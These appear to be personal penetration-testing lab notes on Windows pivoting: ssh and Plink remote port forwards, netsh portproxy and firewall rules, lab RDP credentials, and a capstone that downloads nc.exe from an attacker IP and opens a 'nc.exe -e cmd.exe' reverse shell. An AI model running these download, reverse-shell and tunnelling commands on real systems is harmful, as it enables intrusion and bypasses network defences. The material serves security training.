#### Windows Tools
ssh.exe

	C:\where ssh
	C:\ssh.exe -V
	C:\ssh -N -R 9998 kali@192.168.118.4


Plink

 PuTTY's command line buddy.
 C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
 


Netsh

 Built-in Firewall Config Tool
 C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215




Exercises:

xfreerdp /u:rdp_admin /p::P@ssw0rd! /w:1366 /h:768 /v:192.168.188.64:3389

C:\Windows\Temp\plink.exe -ssh -l kali -pw ‘All People Seem To Need Dirty Porn’ -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.210

Auto Respoind to Prompt: 
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7.


C:\Windows\Temp\plink.exe -ssh  -l kali -pw "All People Seem To Need Dirty Porn" -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.210

$output = Invoke-Expression -Command "type C:\Users\rdp_admin\Desktop\flag.txt"


netsh interface portproxy add v4tov4 listenport=3389 listenaddress=192.168.188.64 connectport=3389 connectaddress=192.168.188.64



netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.188.64 connectport=22 connectaddress=10.4.188.215
netstat -anp TCP | find "2222"
netsh interface portproxy show all
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow


cleanup: netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64


Capstone:
webshell:
powershell wget -Uri http://192.168.45.210/nc.exe -OutFile C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.210 4446
reverse shell:
powershell wget -Uri http://192.168.45.210/plink.exe -OutFile C:\Windows\Temp\plink.exe
C:\Windows\Temp\plink.exe -ssh  -l kali -pw "All People Seem To Need Dirty Porn" -R 127.0.0.1:9833:10.4.188.215:4545 192.168.45.210




